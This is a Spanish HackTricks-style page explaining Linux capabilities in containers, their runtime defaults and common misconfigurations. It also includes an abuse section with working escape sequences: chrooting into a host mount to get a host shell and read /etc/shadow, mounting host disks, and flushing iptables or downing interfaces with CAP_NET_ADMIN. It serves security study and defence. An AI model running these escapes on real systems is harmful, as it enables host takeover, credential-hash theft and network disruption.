# Capacidades de Linux en contenedores

{{#include ../../../../banners/hacktricks-training.md}}

## Resumen

Las capacidades de Linux son una de las piezas más importantes de la seguridad en contenedores porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un contenedor?** En un sistema Linux normal, UID 0 históricamente implicaba un conjunto de privilegios muy amplio. En kernels modernos, ese privilegio se descompone en unidades más pequeñas llamadas capacidades. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si las capacidades relevantes han sido eliminadas.

Los contenedores dependen en gran medida de esta distinción. Muchas cargas de trabajo todavía se inician como UID 0 dentro del contenedor por compatibilidad o sencillez. Sin el drop de capacidades, eso sería demasiado peligroso. Con el drop de capacidades, un proceso root en un contenedor aún puede realizar muchas tareas ordinarias dentro del contenedor mientras se le niegan operaciones del kernel más sensibles. Por eso, un shell dentro del contenedor que muestra `uid=0(root)` no significa automáticamente "root del host" ni siquiera "privilegio amplio del kernel". Los conjuntos de capacidades deciden cuánto vale realmente esa identidad root.

Para la referencia completa de capacidades de Linux y muchos ejemplos de abuso, ver:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capacidades se rastrean en varios conjuntos, incluidos los conjuntos permitted, effective, inheritable, ambient y bounding. Para muchas evaluaciones de contenedores, la semántica exacta del kernel de cada conjunto es menos importante de inmediato que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar este proceso con éxito ahora mismo, y qué ganancias de privilegio futuras siguen siendo posibles?**

La razón por la que esto importa es que muchas técnicas de breakout son en realidad problemas de capacidades disfrazados de problemas de contenedor. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funcionalidad del kernel que un proceso root normal de contenedor no debería tocar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si además comparte el host network namespace. Una carga de trabajo con `CAP_SYS_PTRACE` se vuelve mucho más interesante si puede ver procesos del host mediante el host PID sharing. En Docker o Podman eso puede aparecer como `--pid=host`; en Kubernetes suele aparecer como `hostPID: true`.

En otras palabras, el conjunto de capacidades no puede evaluarse de forma aislada. Debe leerse junto con namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capacidades dentro de un contenedor es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con uno que tenga todas las capabilities añadidas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición mínima, intenta quitar todo y volver a añadir solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a demostrar que un runtime no está simplemente alternando un booleano llamado "privileged". Está moldeando la superficie real de privilegios disponible para el proceso.

## Capacidades de alto riesgo

Aunque muchas capacidades pueden importar dependiendo del objetivo, unas pocas son repetidamente relevantes en el análisis de escapes de contenedores.

**`CAP_SYS_ADMIN`** es la que los defensores deberían tratar con mayor sospecha. A menudo se describe como "the new root" porque desbloquea una enorme cantidad de funcionalidad, incluidas operaciones relacionadas con mount, comportamiento sensible al namespace y muchos caminos del kernel que nunca deberían exponerse casualmente a contenedores. Si un contenedor tiene `CAP_SYS_ADMIN`, seccomp débil y no un confinamiento MAC fuerte, muchas rutas clásicas de breakout se vuelven mucho más realistas.

**`CAP_SYS_PTRACE`** importa cuando existe visibilidad de procesos, especialmente si el PID namespace está compartido con el host o con cargas de trabajo vecinas interesantes. Puede convertir visibilidad en manipulación.

**`CAP_NET_ADMIN`** y **`CAP_NET_RAW`** importan en entornos centrados en red. En una red tipo bridge aislada pueden ya ser riesgosas; en un namespace de red del host compartido son mucho peores porque la carga de trabajo puede ser capaz de reconfigurar la red del host, sniff, spoof, o interferir con los flujos de tráfico locales.

**`CAP_SYS_MODULE`** suele ser catastrófica en un entorno con root porque cargar módulos del kernel es efectivamente control del kernel del host. Casi nunca debería aparecer en una carga de trabajo de contenedor de propósito general.

## Uso del runtime

Docker, Podman, stacks basados en containerd y CRI-O usan controles de capacidades, pero los valores por defecto y las interfaces de gestión difieren. Docker los expone muy directamente a través de flags como `--cap-drop` y `--cap-add`. Podman expone controles similares y con frecuencia se beneficia de la ejecución rootless como una capa de seguridad adicional. Kubernetes expone adiciones y drops de capacidades a través del `securityContext` del Pod o del contenedor. Entornos de system-container como LXC/Incus también dependen del control de capacidades, pero la integración más amplia con el host de esos sistemas frecuentemente tienta a los operadores a relajar los valores por defecto más agresivamente de lo que lo harían en un entorno de app-container.

El mismo principio se mantiene en todos ellos: una capacidad que es técnicamente posible otorgar no es necesariamente una que deba otorgarse. Muchos incidentes del mundo real comienzan cuando un operador añade una capacidad simplemente porque una carga de trabajo falló bajo una configuración más estricta y el equipo necesitaba una solución rápida.

## Misconfiguraciones

El error más obvio es **`--cap-add=ALL`** en CLIs estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es otorgar una o dos capacidades extremadamente poderosas, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione" sin comprender también las implicaciones de namespace, seccomp y mount. Otro modo de fallo común es combinar capacidades extra con compartir namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes la exposición equivalente suele aparecer a través de ajustes de la carga de trabajo como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia lo que la capacidad puede afectar realmente.

También es común ver a administradores creer que, porque una carga de trabajo no es completamente `--privileged`, sigue estando significativamente restringida. A veces eso es cierto, pero otras veces la postura efectiva ya está lo suficientemente cerca de privileged como para que la distinción deje de importar operacionalmente.

## Abuso

El primer paso práctico es enumerar el conjunto efectivo de capacidades y probar de inmediato las acciones específicas de cada capacidad que importarían para un escape o acceso a información del host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` está presente, prueba primero el abuso basado en montajes y el acceso al sistema de archivos del host, porque este es uno de los facilitadores de breakout más comunes:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` está presente y el contenedor puede ver procesos interesantes, verifica si la capability puede convertirse en inspección de procesos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` o `CAP_NET_RAW` está presente, prueba si la carga de trabajo puede manipular la pila de red visible o al menos recopilar inteligencia de red útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Cuando una prueba de capability tiene éxito, combínala con la situación del namespace. Una capability que parece meramente arriesgada en un namespace aislado puede convertirse inmediatamente en un escape o host-recon primitive cuando el contenedor también comparte host PID, host network o host mounts.

### Ejemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si el contenedor tiene `CAP_SYS_ADMIN` y un writable bind mount del sistema de archivos del host como `/host`, la ruta de escape suele ser directa:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` tiene éxito, los comandos ahora se ejecutan en el contexto del sistema de archivos raíz del host:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` no está disponible, a menudo se puede lograr el mismo resultado llamando al binary a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Ejemplo completo: `CAP_SYS_ADMIN` + Acceso a dispositivo

Si se expone un dispositivo de bloque del host, `CAP_SYS_ADMIN` puede convertirlo en acceso directo al sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Ejemplo completo: `CAP_NET_ADMIN` + Host Networking

Esta combinación no siempre produce host root directamente, pero puede reconfigurar completamente la pila de red del host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Eso puede permitir denegación de servicio, intercepción de tráfico o acceso a servicios que antes estaban filtrados.

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es solo hacer dump de raw values, sino entender si el proceso tiene suficientes privilegios para que su namespace y situación de mount actuales sean peligrosos.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Lo interesante aquí:

- `capsh --print` es la forma más sencilla de detectar capabilities de alto riesgo como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` te indica qué es lo que está realmente efectivo ahora, no solo lo que podría estar disponible en otros conjuntos.
- Un volcado de capabilities cobra mucha más importancia si el contenedor también comparte host PID, network, o user namespaces, o tiene writable host mounts.

Después de recopilar la información bruta de capabilities, el siguiente paso es la interpretación. Pregúntate si el proceso es root, si los user namespaces están activos, si se comparten host namespaces, si seccomp está aplicando, y si AppArmor o SELinux siguen restringiendo el proceso. Un capability set por sí solo es solo parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Valores predeterminados en tiempo de ejecución

| Runtime / platform | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reducido por defecto | Docker mantiene una allowlist predeterminada de capabilities y descarta el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reducido por defecto | Los contenedores Podman no son privilegiados por defecto y usan un modelo de capabilities reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime a menos que se cambie | Si no se especifica `securityContext.capabilities`, el contenedor obtiene el conjunto de capabilities predeterminado del runtime | `securityContext.capabilities.add`, no realizar `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Normalmente el predeterminado del runtime | El conjunto efectivo depende del runtime más la especificación del Pod | mismo que la fila de Kubernetes; la configuración directa de OCI/CRI también puede añadir capabilities explícitamente |

Para Kubernetes, el punto importante es que la API no define un único conjunto de capabilities predeterminado universal. Si el Pod no añade ni elimina capabilities, la carga de trabajo hereda el valor predeterminado del runtime para ese nodo.
{{#include ../../../../banners/hacktricks-training.md}}
